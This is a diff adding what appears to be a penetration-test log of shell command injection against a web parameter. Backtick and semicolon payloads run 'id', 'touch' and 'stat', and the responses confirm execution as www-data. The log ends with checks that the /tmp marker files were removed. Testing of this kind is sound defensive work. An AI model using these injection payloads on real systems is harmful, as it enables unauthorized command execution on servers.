@@ -1,0 +1,34 @@
+################ I1_backtick_repeat_of_G4
+RAW_PARAM: w\h\o\a\m\i`id`
+BODY: <pre></pre><pre></pre>|HTTP=200|BYTES=22
+
+################ I2_backtick_marker_write_CONTROL
+RAW_PARAM: w\h\o\a\m\i`touch /tmp/bt-marker-73`
+BODY: <pre></pre><pre>www-data
+</pre>|HTTP=200|BYTES=31
+
+################ I3_backtick_marker_stat
+RAW_PARAM: w\h\o\a\m\i`stat -c %s /tmp/bt-marker-73`
+BODY: <pre></pre><pre></pre>|HTTP=200|BYTES=22
+
+/tmp/bt-marker-73 0 bytes uid=33
+################ I4_semicolon_repeat_of_G1
+RAW_PARAM: w\h\o\a\m\i;id
+BODY: <pre></pre><pre>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>|HTTP=200|BYTES=63
+
+=== RESTORE VERIFY via stat -c ===
+stat: cannot statx '/tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a': No such file or directory
+stat: cannot statx '/tmp/bt-marker-73': No such file or directory
+rc=1
+=== /tmp listing ===
+total 8
+drwxrwxrwt 1 root     root     4096 Oct  1 16:28 .
+drwxr-xr-x 1 root     root     4096 Oct  1 16:23 ..
+-rw-r--r-- 1 www-data www-data    0 Oct  1 16:26 opencode-marker-73-
+--- verify all marker artifacts gone (stat -c) ---
+stat: cannot statx '/tmp/opencode-marker-73-': No such file or directory
+stat: cannot statx '/tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a': No such file or directory
+stat: cannot statx '/tmp/bt-marker-73': No such file or directory
+--- /tmp now ---
